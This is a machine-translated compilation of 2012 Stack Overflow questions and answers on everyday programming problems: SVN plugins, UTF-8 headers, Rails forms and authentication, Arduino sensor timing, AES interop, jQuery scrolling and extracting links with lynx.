# StackOverflow 问答 11820000-11820999

# ruby-on-rails - 使用 Aptana 安装源代码控制

> ID：11820000
> 
> 赞同：1
> 
> 时间：2012-08-05T20:54:11.663
> 
> 标签：ruby-on-rails, svn, tortoisesvn, aptana

我正在使用 Aptana Studio 3，构建：3.2.1.201207261642，我想将我的代码添加到任何类型的源代码控制以实现可管理性。它只是一个宠物项目，我正在做这个项目来学习 ruby​​ on rails。

通过 aptana IDE 安装 SVN 时，出现以下错误。

我缺少先决条件吗？

![在此处输入图像描述](../Images/375f4bb5ebbe32a661b1f5669966e9eb.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T19:33:33.663

要让 Subclipse 在没有先决条件的情况下工作，请取消选中：

*   Mylyn 3.x 的 Subclipse 集成（可选）
*   颠覆修订图

它们不是强制性的。

如果您真的想使用 Subclipse Revision Graph，请将 GEF 添加到您的更新站点并安装 Draw2D：[Eclipse 更新站点](http://download.eclipse.org/tools/gef/updates/releases/)

如果您真的想为 Mylyn 3.x 使用 Subclipse 集成，请安装 Eclipse Marketplace。[这个](http://marketplace.eclipse.org/quickstart)网站会有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T01:38:20.543

看起来您的问题是您想使用*Subversion Revision Graph*并且您缺少依赖项，而 Aptana 找不到它。有两种解决方案：

*   取消选中*Subversion Revision Graph*。如果需要，可以使用 TortoiseSVN。
*   [安装缺少的依赖项](http://www.eclipse.org/gef/draw2d/index.php)。它位于错误消息的底部：org.eclipse.draw2d（3.2.0 版）。可能是它没有安装，或者您安装了旧版本。您可能想要更新所有已安装的软件，看看是否可以安装它。

[Cigano Morrison Mendez](https://stackoverflow.com/a/13276850/368630)提到*Mylyn 3.x 的 Subclipse 集成（可选）*也缺少先决条件，但我没有看到。然而，Mylyn 是 Eclipse 的一个问题跟踪系统，并集成到 MantisBT、Rally 和 Jira 之类的东西中。如果您没有问题跟踪系统，那么您真的不需要 Mylyn。继续并取消选中它。

# python - 你如何解析使用 pysvn 创建的差异文件？

> ID：11820004
> 
> 赞同：2
> 
> 时间：2012-08-05T20:54:40.337
> 
> 标签：python, svn, diff, pysvn

pysvn 有办法解析它创建的差异文件吗？我想添加文件名/文件路径、每个包含文件的头版本、更改的总行数、更改的文件总数等。

如果没有，有没有手动的方法呢？我需要为 diff 中包含的每个文件解析一个以“Index：”开头的 diff 文件，但我不知道这些文件的确切格式。因此，如果 pysvn 没有解析这个的方法，我需要弄清楚格式是什么并自己做（在 Python 中）。格式是特定于 SVN 的格式吗？出版了吗？用于解析它的 Python 示例代码会很棒！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T09:00:06.817

[我能够使用这个](http://bazaar.launchpad.net/~bzr-pqm/bzr/bzr.dev/view/head:/bzrlib/patches.py)编写几行自定义代码。它完全挽救了这一天，对亚伦·本特利来说太棒了！

# php - PHP & HTML5：带有标签或通过 header() 函数的UTF-8 文档声明？

> ID：11820006
> 
> 赞同：2
> 
> 时间：2012-08-05T20:54:49.587
> 
> 标签：php, html, utf-8, header

我正在尝试优化我的框架处理 HTML5 页面生成的方式。现在，我要做的是`<meta charset="utf-8"/>`在标签之后插入一个`<head>`，所以它是要指定的第一个元素（所以当我传递`<title>`标签和其余页面元素时，它已经被定义为以 UTF-8 编码）。

问题是我正在阅读一些关于网站性能优化的书籍，其中大多数建议通过`Content-type`声明指定编码，而不是插入`<meta>`块。

W3C 关于字符编码检测的文档（第 8.2.2.1 节）说，基本上，HTTP 标头优先于任何显式声明，除非用户通过用户代理声明了对内容类型的覆盖。

但是，W3C 验证器（这就是我用来调试 HTML 代码输出的原因）没有抱怨，而是警告我没有`<meta charset="utf-8"/>`块，因此鼓励我把它（它说如果渲染页面是特别推荐的）得救，事实并非如此，但仍然......它让我有点困惑）。

问题是......如何确保页面始终指定为 UTF-8 编码？我必须声明 HTTP 标头和`<meta>`标签还是仅声明 HTTP 标头？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-05T21:08:57.517

我没有比这更好的描述了：[HTML 5 之路：字符编码](http://blog.whatwg.org/the-road-to-html-5-character-encoding)

> 这是一个7步算法；第 4 步有 2 个子步骤，其中第一个有 7 个分支，其中一个有 8 个子步骤，其中一个实际上链接到一个单独的算法，该算法本身有 7 个步骤......这样持续了一段时间. 它的要点是

*   **用户覆盖。**- 你对此没有影响
*   **“内容类型”字段中的 HTTP“字符集”参数。**在 PHP 代码中是：

    ```
    header('Content-Type: text/html;charset=UTF-8'); 
    ```

*   **HTML 文档本身中任何其他数据之前的字节顺序标记。**- 我不能建议实际使用该功能。如果您愿意，只需相应地保存您的文件，但不要指望`header()`电话能再完美无缺地工作。另一种方法是手动输出 BOM，在 PHP 中是：

    ```
    echo "\xEF\xBB\xBF"; # UTF-8 BOM 
    ```

    但即便如此，我也不建议输出 BOM，因为这是对*输出*的向后不兼容的更改。这些指南用于阅读 - 不是输出。

*   **具有“字符集”属性的 META 声明。**- 请这样做，这是一个很好的做法。在 HTML 5 中是：

    ```
    <meta charset="UTF-8"> 
    ```

*   **将“http-equiv”属性设置为“Content-Type”并为“charset”设置值的 META 声明。**- 为什么不？！在 HTML 5 中，这将是：

    ```
    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8"> 
    ```

*   **未指定的启发式分析。**- 你对此没有影响。

这些是要点。我的建议如下：

*   检查您的网络服务器在提供 HTML 时是否发送了正确的标头。
*   拥有您的 HTML 以及那些元标记，以便可以将 HTML 文件保存在磁盘上并稍后在浏览器中打开它（离线，存档）。
*   如果您使用 UTF-8，请不要将 BOM 放入文档中。
*   不要使用 UTF-16 或 UTF-32，如果使用 Unicode，请使用 UTF-8。

如果您的目标系统完全不了解编码，请使用 US-ASCII 并将其他不属于它的所有内容作为 HTML 实体进行掩码。

> ***注意：**此实体建议是用于输出到浏览器而不是用于存储，存储属于您的区域，请确保您在处理商店时了解编码。永远不要使用 HTML 实体，例如当你将 HTML 写入你的 mysql 数据库时，当你真的不需要它时（例如`&amp;`在 HTML 链接中）。*

# iphone - 为什么无法在 uiwebview 中打开 .docx 文件

> ID：11820008
> 
> 赞同：2
> 
> 时间：2012-08-05T20:54:57.070
> 
> 标签：iphone, ios, ipad, uiwebview

我是 iphone 新手，我正在尝试在 UIWebView 中打开 .docx 文件

我使用了这段代码：

```
NSString *urlAddress = [[NSBundle mainBundle] pathForResource:docName 
                                                       ofType:@"docx"]; 

NSLog(@"the document url address: %@", urlAddress);

NSURL *url  = [NSURL fileURLWithPath:urlAddress];
NSURLRequest *requestObj  = [NSURLRequest requestWithURL:url];

[_webView loadRequest:requestObj]; 
```

还有这段代码：

```
NSData *myData = [NSData dataWithContentsOfFile:docName];
[_webView loadData:myData MIMEType:@"application/vnd.ms-word"
   textEncodingName:@"UTF-8" baseURL:[NSURL URLWithString:@""]]; 
```

我确定资源文件夹中的文件，但是在运行时它给了我一个异常并在 main.m 中说

```
int main(int argc, char *argv[])
{
@autoreleasepool {
    // here it tells me that (Thread 1: signal SIGKILL)
    return UIApplicationMain(argc, argv, nil, NSStringFromClass([MFAppDelegate class]));
}
} 
```

有什么帮助吗？？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T20:59:23.187

根据[http://developer.apple.com/library/ios/#qa/qa1630/_index.html#//apple_ref/doc/uid/DTS40008749](http://developer.apple.com/library/ios/#qa/qa1630/_index.html#//apple_ref/doc/uid/DTS40008749)您根本无法打开 .docx 文件，而只能打开 .doc 文件，这是您的问题可能

# ruby-on-rails - 我怎样才能让用户只在 url_field 中添加他们的@name 而不是整个 Twitter 链接？

> ID：11820013
> 
> 赞同：0
> 
> 时间：2012-08-05T20:55:08.930
> 
> 标签：ruby-on-rails, devise

在我的 Rails 应用程序中，我有一个带有 url_field 用于 Twitter 的用户模型（设计）。

现在我的显示页面中有这个：

```
<%= link_to @deal.user.company_twitter, @deal.user.company_twitter, :class => "comp_twitter" %> 
```

它在显示页面中显示整个链接（甚至`http://`），这是因为我的 url_field 使用户添加“http://”，否则它不会验证链接。

我希望用户在创建个人资料时只添加他们的“@name”而不是整个 Twitter 链接。我还想在“显示”页面中只显示@name 而不是 Twitter 链接。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T21:06:29.957

Simply don't use an `url_field`, but a regular `string` database field, like `twitter_username`. When signing up, let the user enter their username, e.g. `foo`.

For getting the real URL to the Twitter account, create a new method in your `user.rb` model:

```
def twitter_url
  "http://twitter.com/#{self.twitter_username}"
end 
```

The advantage is that at this point, in your model, you can include a custom validation that would check if this URL really exists after the user has submitted their `twitter_username`.

Finally, use that in your view instead of just the URL:

```
<%= link_to "@#{@user.twitter_username}", @user.twitter_url %> 
```

This would render:

```
<a href="http://twitter.com/foo">@foo</a> 
```

# ruby-on-rails - 使用 Ruby on Rails 的 angular.js 中的安全性

> ID：11820015
> 
> 赞同：13
> 
> 时间：2012-08-05T20:55:20.527
> 
> 标签：ruby-on-rails, security, angularjs

进行身份验证的最佳方法是什么？

在前端我使用 Angular.js

后端：Ruby on Rails

Rails 应用程序用作我的前端的 API。

**更新：** 这将是**单页应用程序**。前端将使用 Angular.js 开发，后端使用 Ruby on Rails。理想情况下，我想将后端构建为 json 中返回的资源集合。

我搜索安全实施的最佳方法。

当用户打开应用程序时，我需要检查用户是否经过身份验证。如果没有 - 转到登录页面，如果经过身份验证 - 打开他想要的并从后端返回所需的资源。

我认为我需要在客户端存储身份验证令牌。生成它的最佳方法是什么，或者 Rails 已经为我生成了它？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-06T14:02:29.033

我根本不了解 Angular.JS，但我会尝试为您提供有关可以与任何 Javascript 框架一起使用的 Rails 的一般信息。

对于身份验证，您只需要：

*   用户模型
*   处理登录的控制器，此方法检查用户登录名/密码，创建包含所有所需信息的会话对象（会话存储在服务器端，客户端使用 cookie 将每个请求与会话相关联）
*   用于处理注销的控制器，基本上只会破坏用户的会话

[你在这里的rails教程中](http://ruby.railstutorial.org/chapters/sign-in-sign-out#top)有一个很好的实现，或者你可以找到几个插件（[authlogic](https://github.com/binarylogic/authlogic/)似乎是stackoverflow用户的推荐[）](https://stackoverflow.com/questions/1080306/rails-authentication-plugin-recommendation)。

然后，使用静态 html 页面或使用 AJAX 处理身份验证之间几乎没有区别：

*   HTML 请求将向控制器发送登录名和密码，一旦会话创建，控制器将自动将其重定向到另一个内部页面
*   在 AJAX 中，客户端的 javascript 应该发送一个 ajax 请求，寻找服务器的答案（成功/失败）并启动适应的操作（如果失败则消息，如果成功则重定向）

在这两种情况下，重要的是检查用户在每个控制器上是否经过身份验证，否则任何人都将被允许启动操作或访问内部信息。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-01T04:20:57.357

我正在尝试做类似的事情，我发现这个示例应用程序对让我朝着正确的方向前进非常有用：[https ://github.com/karlfreeman/angular-devise](https://github.com/karlfreeman/angular-devise)

还可以在这里查看关于它的进一步讨论：[https ://github.com/karlfreeman/angular-devise/issues/1](https://github.com/karlfreeman/angular-devise/issues/1)

这是另一个采用稍微不同方法的存储库：[https ://github.com/colindensem/demo-rails-angularjs](https://github.com/colindensem/demo-rails-angularjs)

我最终借鉴了以上所有的想法。如果有人感兴趣，这是一个工作演示：[https ://github.com/jesalg/RADD](https://github.com/jesalg/RADD)

# java - 将当前类加载到 JarOutputStream

> ID：11820016
> 
> 赞同：0
> 
> 时间：2012-08-05T20:55:37.563
> 
> 标签：java, class, jar

我正在构建一个必须在运行时加载当前类的应用程序，并将其添加到我正在创建的不同 .jar 中。我有一种将文件添加到 jar 的方法。

```
private static void add(File source, JarOutputStream target,
        Manifest manifest) throws IOException {
    BufferedInputStream in = null;
    try {
        String name = source.getName();
        JarEntry entry = new JarEntry(name);
        entry.setTime(source.lastModified());
        target.putNextEntry(entry);
        in = new BufferedInputStream(new FileInputStream(source));

        byte[] buffer = new byte[1024];
        while (true) {
            int count = in.read(buffer);
            if (count == -1)
                break;
            target.write(buffer, 0, count);
        }
        target.closeEntry();
    } finally {
        if (in != null)
            in.close();
    }
} 
```

我的问题是：我似乎不知道如何在运行时将当前类添加到文件中。我试过这个：

```
File classFile= new File(getClass().getResource("MyClass.class").getPath()); 
```

但我得到一个空指针异常。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T21:02:28.693

不要尝试获取类文件`File`- 只需直接获取流：

```
InputStream classFile = getClass().getResourceAsStream("MyClass.class"); 
```

当然，您需要修改`add`方法以获取目标名称和输入流。（可能会重载它，所以你仍然可以使用现有的方法，它只会打开文件，调用另一个方法，然后关闭流。）

# c++ - 我的 arduino 传感器程序有什么问题？

> ID：11820021
> 
> 赞同：2
> 
> 时间：2012-08-05T20:56:27.007
> 
> 标签：c++, arduino

我在这里买了这个湿度/温度传感器： [https ://www.sparkfun.com/products/10167](https://www.sparkfun.com/products/10167)

我在这里阅读了数据表：http: [//dlnmh9ip6v2uc.cloudfront.net/datasheets/Sensors/Weather/RHT03.pdf](http://dlnmh9ip6v2uc.cloudfront.net/datasheets/Sensors/Weather/RHT03.pdf)

我尝试使用我的 c++ 类中的一些基础编程，但我不知道问题出在哪里？看起来来自传感器的数据输入没有发送任何内容。在数据表上，我需要发送一个 5V 的输入信号（持续 20-40 毫秒），然后等待传感器的响应并存储传入的位。传感器数据始终为 0。我不明白为什么。

```
/* Code for the RHT03 Sensor 8/5/12 */

int i=0;
int SensorVccPin = 13; 
int datapin = 7;
int bitcheck1;
int bitcheck2;
int temp[16];
int humidity[16];
int sensorcheck[8];

void setup()
{
  pinMode(SensorVccPin, OUTPUT);  
  pinMode(datapin, INPUT);
}

void loop()
{
  // This is the STEP #1
  digitalWrite(SensorVccPin, LOW);
  delayMicroseconds(10);

  digitalWrite(SensorVccPin, HIGH);  
  delayMicroseconds(30);   
  digitalWrite(SensorVccPin, LOW);  
  /* NEED TO DO BIG NESTED IF STATEMENTS!!!!*/

  digitalRead(datapin); 

  if (digitalRead(datapin) == LOW)    // FIRST BIG IF
    while(digitalRead(datapin) == LOW)
    {
      delayMicroseconds(2);   
    }

  while(digitalRead(datapin) == HIGH)
  {
      delayMicroseconds(2);   
  }

  // STEP #2
  for (int i = 0; i<16; i++)
  {
    while(digitalRead(datapin) == LOW)
    {
      delayMicroseconds(2); 
    }  

    delayMicroseconds(10);

    bitcheck1 = digitalRead(datapin);   // maybe store as an array
    delayMicroseconds(17);      // 50 sec pause  // 27us = 0 bit, 70us is 1 bit data
    delayMicroseconds(15); 
    bitcheck2 = digitalRead(datapin);

    if (bitcheck1==bitcheck2)
    {
       temp[i]=1;
       delayMicroseconds(28); 
    } else {
       temp[i]=0;
    }
  }

  for (int i = 0; i<16; i++)
  {
    while(digitalRead(datapin) == LOW)
    {
      delayMicroseconds(2); 
    }  

    delayMicroseconds(10);
    bitcheck1 = digitalRead(datapin);   // maybe store as an array
    delayMicroseconds(17);      // 50 sec pause  // 27us = 0 bit, 70us is 1 bit data
    delayMicroseconds(15); 
    bitcheck2 = digitalRead(datapin);

    if (bitcheck1==bitcheck2)
    {
       humidity[i]=1;
       delayMicroseconds(28); 
    } else {
       humidity[i]=0;
    }
  }

  for (int i = 0; i<8; i++)
  {
    while(digitalRead(datapin) == LOW)
    {
      delayMicroseconds(2); 
    }  

    delayMicroseconds(10);

    bitcheck1 = digitalRead(datapin);   // maybe store as an array
    delayMicroseconds(17);      // 50 sec pause  // 27us = 0 bit, 70us is 1 bit data
    delayMicroseconds(15); 
    bitcheck2 = digitalRead(datapin);

    if (bitcheck1==bitcheck2)
    {
       sensorcheck[i]=1;
       delayMicroseconds(28); 
    } else {
       sensorcheck[i]=0;
    }
  }
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-05T21:07:21.697

The datasheet says;

> MCU will pull low data-bus and this process must beyond at least 1~10ms to ensure RHT03 could detect MCU's signal

Your code says;

```
digitalWrite(SensorVccPin, LOW);
delayMicroseconds(10);

digitalWrite(SensorVccPin, HIGH); 
```

You seem to be delaying 10µs instead of 10ms.

# asp.net - 在 asp.net mvc 中使用 EditorFor 和 DateTime

> ID：11820022
> 
> 赞同：0
> 
> 时间：2012-08-05T20:57:08.570
> 
> 标签：asp.net, asp.net-mvc-3, asp.net-mvc-4

我正在将该`Html.EditorFor()`方法用于`DateTime`字段。但是我遇到了一个错误，比如*Year、Month 和 Day 参数描述了无法表示的 DateTime。*

然后我明白这是因为月份值大于 12 或小时值大于 23。我选择了正确的值，但我认为由于本地化问题，它会改变月份和日期之间的位置。

还有一些代码；

从视角看；

```
 <tr>
    <td>
        <div class="editor-label" style="text-align: right;">
            <b>@Html.LabelFor(c => c.Created)</b>
        </div>
    </td>
    <td>
        <div class="editor-field">
            @Html.EditorFor(c=>c.Created)
            @Html.ValidationMessageFor(c => c.Created)
        </div>
    </td>
</tr> 
```

从视图模型方面；

```
 [Display(Name = "Created", ResourceType = typeof(ModelLocalization))]
        public DateTime Created { get; set; } 
```

我该如何格式化？我应该怎么办？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-06T07:26:05.987

您可以使用（免费）Telerik MVC 扩展的 TimePicker 控件。[请参阅此处](http://demos.telerik.com/aspnet-mvc/datepicker)的演示和[此处（例如）下载](http://nuget.org/packages/TelerikMvcExtensions)。

注意：MVC 扩展最近被新产品取代，MVC 扩展的维护将[很快停止](http://www.telerik.com/community/forums/aspnet-mvc/general/telerik-mvc-extensions-resources.aspx)。

# php - 从 JSON 填充 Objective-C 数组

> ID：11820034
> 
> 赞同：0
> 
> 时间：2012-08-05T20:58:52.017
> 
> 标签：php, objective-c, json

我有一个从 mysql 获取值的 php 文件。我想将我的 php 文件的所有值放入 xcode 数组中。我的 php 文件在 3 列中返回数据：“ID”、“名称”和“消息”。如何将此数据加载到我的 xcode 数组中？

我的php输出是：

```
[{"id":"7","Name":"Benedict","Message":"IT Support Engineer"},{"id":"6","Name":"Naushad","Message":"IT Support"}] 
```

我想将每一列的数据放入不同的数组中，即 ID 应该在*myid*数组中，名称应该在*myname*数组中，消息应该在*mymessage*数组中。

我非常感谢您的帮助，因为我上周一直在尝试解决这个问题。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T21:07:42.790

JSONKit (https://github.com/johnezang/JSONKit/)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T21:10:44.653

如果您使用的是 iOS 5 或更高版本，则可以使用内置的 JSON 序列化程序。

[http://developer.apple.com/library/mac/#documentation/Foundation/Reference/NSJSONSerialization_Class/Reference/Reference.html#//apple_ref/doc/uid/TP40010946](http://developer.apple.com/library/mac/#documentation/Foundation/Reference/NSJSONSerialization_Class/Reference/Reference.html#//apple_ref/doc/uid/TP40010946)

# vim - 在模式行中应该使用哪些 vim 选项？

> ID：11820042
> 
> 赞同：1
> 
> 时间：2012-08-05T20:59:51.487
> 
> 标签：vim, modeline

我想知道我应该在源文件（主要是 C）的模式行中指定哪些 vim 选项*，*哪些*不应该*在那里指定，而应该留给用户指定。

我相信模式应该强制执行特定于代码的策略和/或帮助 vim 处理代码，同时尽可能避免干扰用户偏好。

回答时，*请*解释为什么您认为应该通过模式行强制执行特定选项。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T20:59:51.487

现在，我发现以下选项很有用：

*   `ft`确保 vim 正确识别文件格式，
*   `noet`并`sts=0`禁用将制表符扩展到空格（项目编码样式），
*   或者`et`,并强制执行特定于项目的选项卡扩展`ts`，`sts``sw`
*   也许`tw`建议换行（但我不太确定，因为它有点*侵入性*），
*   `fenc`表示字符编码。

这些是我认为我不应该设置的选项：

*   `ts`如果项目使用制表符缩进——我相信用户应该能够选择自己的制表符宽度，
*   折叠——用户偏好，
*   缩进——用户可能有一种偏好的缩进方式和改变方式，这实际上可能会因为习惯而导致额外或缺失的缩进，
*   `ff`因为 vim 应该正确推断换行格式，如果某些软件（如 VCS）透明地转换文件，`ff`实际上会破坏它。

# python - Python M2Crypto 的 AES 128 加密不同于 PHP 的 Mcrypt

> ID：11820049
> 
> 赞同：0
> 
> 时间：2012-08-05T21:01:19.940
> 
> 标签：python, django, m2crypto

这是我的 Python 代码，我可以使用 M2Crypto 成功加密和解密：

```
from base64 import b64encode, b64decode
import M2Crypto

class AESEncryptionService(object):
    def encrypt(self, key, msg):
        return self.__cipher(key, msg, 1)

    def decrypt(self, key, msg):
        try:
            decrypted = self.__cipher(key, msg, 0)
            return decrypted
        except:
            return False

    def __cipher(self, key, msg, op):
        iv = '\0' * 16
        iv.encode('ascii')
        cipher = M2Crypto.EVP.Cipher(alg='aes_128_cbc', key=key, iv=iv, op=op)
        v = cipher.update(msg)
        v = v + cipher.final()
        del cipher
        return v

enc_service = AESEncryptionService()
cipher = b64encode(enc_service.encrypt("FD496E240E7822552BC0D63C03AB7ABB", "Hello Hello Hello Hello Hello Hello Hello"))

print cipher

plaintext = enc_service.decrypt("FD496E240E7822552BC0D63C03AB7ABB", b64decode(cipher))

print plaintext 
```

输出：

```
oMkdgXOy49VvvbQksxuhBq3YqJWrEw++lZO3ZMYYyo6T7JpK+Ovp+tdm+FrVGPnN
Hello Hello Hello Hello Hello Hello Hello 
```

我用 PHP 编写了一个简单的测试脚本，希望得到相同的结果：

```
<?php

$key = 'FD496E240E7822552BC0D63C03AB7ABB';
$plain = 'Hello Hello Hello Hello Hello Hello Hello';
$iv = '0000000000000000';

$cipher = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $plain, MCRYPT_MODE_CBC, $iv);

$plain = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key, $cipher, MCRYPT_MODE_CBC, $iv);

echo base64_encode($cipher), '<br>';
echo $plain; 
```

输出：

```
v5QinnNaEkn8myZa31Ikl5DrrtSXrhebDERJz4uqUgWMvbZ3datyCbm9WHPGlAo7
Hello Hello Hello Hello Hello Hello Hello 
```

你能帮我修复 Python 代码以输出与 PHP 相同的输出吗？我知道 PHP 的 AES 实现是正确的，因为我可以在 .NET 中对其进行解密。M2Crypto Python 库输出的字符串无法在 .NET 中解密。

我认为这可能与填充有关。

M2Crypto.EVP.Cipher 具有填充参数。我尝试将其设置为 1、2、3、128，但它似乎不会影响密码。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T21:09:38.233

您的 PHP`$iv`似乎是一串 ASCII 零（因此， byte `0x30`），在 python 中`iv`您似乎使用的是文字`0x00`字节。

**编辑**

您似乎还通过`b64encode`and传递密文`b64decode`。你确定这些是精确的倒数吗？没有换行符、格式化、尾随新行等？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T21:27:52.040

快速谷歌搜索显示以下片段：[http ://www.example-code.com/python/crypt2_aes_matchPhp.asp](http://www.example-code.com/python/crypt2_aes_matchPhp.asp)

也许值得一试？

# jquery - 链接到不同的页面-> jquery 滚动到特定的锚点

> ID：11820055
> 
> 赞同：6
> 
> 时间：2012-08-05T21:02:16.303
> 
> 标签：jquery, hyperlink, smooth-scrolling

在我的主页底部，我包含了一个联系表格，并将此部分的锚指定为 div id="contact"。

在任何页面上单击联系按钮时，它应该导航到主页并在页面加载时自动滚动到联系表格。

在查看了我在此处找到的类似问题后，我一直未能成功地使其工作：[jQuery scroll to ID from different page](https://stackoverflow.com/questions/9652944/jquery-page-scroll-to-different-page) 当我尝试时，它只是跳转到表单。我希望它平滑滚动。

```
<li><span>Get in touch</span><a href="index.html#contact">Contact</a></li> 
```

问题 jquery 函数从其他页面滚动到主页上的联系人锚点：

```
(function($){
    var jump=function(e) {
        if (e) {
            e.preventDefault();
            var target = $(this).attr("href");
        } else {
            var target = location.hash;
        }

        $('html,body').animate({
            scrollTop: $(target).offset().top
        },1000,function() {
            location.hash = target;
        });
    }

    $('html, body').hide()

    $(document).ready(function() {
        $('a[href^=#]').bind("click", jump);

    if (location.hash) {
        setTimeout(function(){
            $('html, body').scrollTop(0).show()
            jump()
        }, 0);
    } else {
      $('html, body').show()
    }
}); 
```

我正在尝试实现与此示例类似的内容：http: [//vostrel.cz/so/9652944/page.html](http://vostrel.cz/so/9652944/page.html) 不同之处在于，在这种情况下，锚点 ID（联系）对我来说只出现在一页（主页）上。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-02-11T21:29:46.523

试试这个，你的脚本没问题，只是缺少最后一行

```
 (function ($) {

     var jump = function (e) {
         if (e) {

             e.preventDefault();
             var target = $(this).attr("href");

         } else {

             var target = location.hash;

         }
         $('html,body').animate({

             scrollTop: $(target).offset().top

         }, 1000, function () {

             location.hash = target;

         });
     }

     $('html, body').hide();

     $(document).ready(function () {
         $('a[href^=#]').bind("click", jump);

         if (location.hash) {
             setTimeout(function () {

                 $('html, body').scrollTop(0).show()
                 jump();

             }, 0);
         } else {

             $('html, body').show();

         }
     });
 })(jQuery) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T09:16:20.767

我在测试您的代码时遇到的小提示：

因为您使用的是锚标记的 href 属性，所以它以#contact 的形式出现，jQuery 将其解释为 ID。

无论它位于哪个页面，您都需要向锚点添加一个 id="contact" 以使其正常工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-05T21:42:35.663

我不确定你的代码是什么，但我已经能够让它工作。一件事是，您发布的代码`})(jQuery)`最后缺少 a 。不管怎样，看看我在[这里](http://somekidwithhtml.webs.com/testing/jqueryscroll/index.html)做了什么，我想这就是你要找的。我不确定您网站的 HTML 是什么样的，但我认为您可以调整它。您需要做的就是将联系人按钮的 href 属性设置为`index.html#contact`. 在 index.html 上，你可以使用`#contact`它，它会做同样的事情。

在 index.html 中，标题：

```
<div id="header">
    <a href="index.html">Homepage</a>
    <a href="otherpage.html">Other page</a>
    <a href="otherpage2.html">Another Page</a>
    <a href="#contact">Contact</a>
</div> 
```

但在任何其他页面：

```
<div id="header">
    <a href="index.html">Homepage</a>
    <a href="otherpage.html">Other page</a>
    <a href="otherpage2.html">Another Page</a>
    <a href="index.html#contact">Contact</a>
</div> 
```

在 index.html 的标题中删除`index.html`可防止页面被加载两次，因此 jQuery 只需向下滚动页面。

# php - 'fi' 在数据库中显示不正确

> ID：11820058
> 
> 赞同：2
> 
> 时间：2012-08-05T21:03:17.183
> 
> 标签：php, mysql, html, entity

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-08-05T21:06:10.487

This statement will correct all the false instances for the column that contains the 'ï¬'

```
Update table Set 
  column = replace(column, 'ï¬', 'fi') 
```

# linux - Link extraction from a google page in bash

> ID：11820061
> 
> 赞同：2
> 
> 时间：2012-08-05T21:04:01.310
> 
> 标签：linux, bash, hyperlink, w3m

I'm making a script that takes all the links from a google page in bash. I get the google page with the `w3m` utility and this script:

```
#!/bin/bash 
# performs a google search using a word in input

word=$1

touch .google

if [ -z $word ]
then
    echo "$word missing!"
    echo "Aborting..."
    exit
fi

a="www.google.com/search?q="  
search=$a$word

w3m -no-cookie $search > .google

sleep 1 
```

Next, I have to get all the sites from this page. I was thinking to take all the string that start with `www.` and ends with `/`

```
echo `grep -wo "www[^/]*" .google`> .temp 
```

The problem with this is that I miss a lot of the links that don't start with `www` and at the same time I risk breaking everything when there is a site that doesn't end with `/`.

What better way could I get the urls from this response?

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-05T21:20:42.410

链接提取是一个难题。但是，该`lynx`程序有一个方便的`-dump`选项，可以让您跳过大部分（或全部）html 解析。

具体来说，请注意`References`底部的部分。您可以从该行开始输出，并去掉前导项目符号编号：

```
$ lynx -dump 'http://www.seomoz.org/'
   #[1]RSS 2.0 [2]publisher

   [3]SEOmoz
     * [4]Log in
     * [5]Sign up
     * [6]Help
          + [7]Help Resources
          + [8]Support Forums
          + [9]Request a Feature
          + [10]Contact Us

     * [11]Features
     * [12]Pricing & Plans
     * [13]Community
          + [14]SEO Blog
          + [15]YOUmoz User Blog
          + [16]Top Users
          + [17]Events
          + [18]Recommended Companies
     * [19]Resources
          + [20]Learn SEO
          + [21]SEO Tools
          + [22]PRO Q&A Forum
          + [23]Mozscape API
     * [24]Blog
          + [25]SEO Blog
          + [26]YOUmoz User Blog
     * [27]About
          + [28]Our TAGFEE Mission
          + [29]Meet the Mozzers
          + [30]Contact Us
          + [31]Join Our Team
          + [32]Press & Awards
          + [33]Events

   Search SEOmoz

   ____________________ Search

SEO & Social Monitoring

Made Simple.

   SEOmoz PRO combines SEO management, social media monitoring, actionable
   recommendations, and so much more in one easy-to-use platform. Try it
   free for 30 days.
   [34]Try it for Free!

   [35]Take a tour of SEOmoz PRO
   or see [36]plans & pricing

     * Campaign Overview
     * Social Dashboard
     * Crawl Diagnostics
     * Dashboard
     * Google Analytics
     * Link Analysis

Loved By...

     * Zillow
     * Disney
     * Overstock
     * Best Buy
     * Yelp
     * Sun Microsystems

   Roger Mozbot

Be My Buddy...

     * [37]RSS
     * [38]Twitter
     * [39]Facebook
     * [40]Google+

Effectively Manage Your SEO and Monitor Your Social Media

   [41]Link Analysis

   Analyze links and track key performance metrics in an efficient
   all-in-one dashboard.
   [42]Identify SEO Issues

   Identify critical SEO issues and get actionable recommendations.
   [43]Monitor Changes

   Automatically monitor changes to your rankings and take control of your
   organic traffic.
   Avinash Kaushik

     "SEOmoz tools provide best of class data. Their tools are a
     must-have for marketers looking to optimize their organic search
     results."

Avinash Kaushik,

   Author, Web Analytics 1.0: An Hour A Day
   Patrick Altoft

     "SEOmoz has enabled us to scale our link-building process quickly
     without compromising on quality."

Patrick Altoft,

   CEO, Branded3

Latest from the SEOmoz Blog
     __________________________________________________________________

   [44]jennita

[45]Winners of #MozCation 2012

   Posted by [46]jennita on 08/04/2012
   Whoa. Ever have one of those times where your expectations are
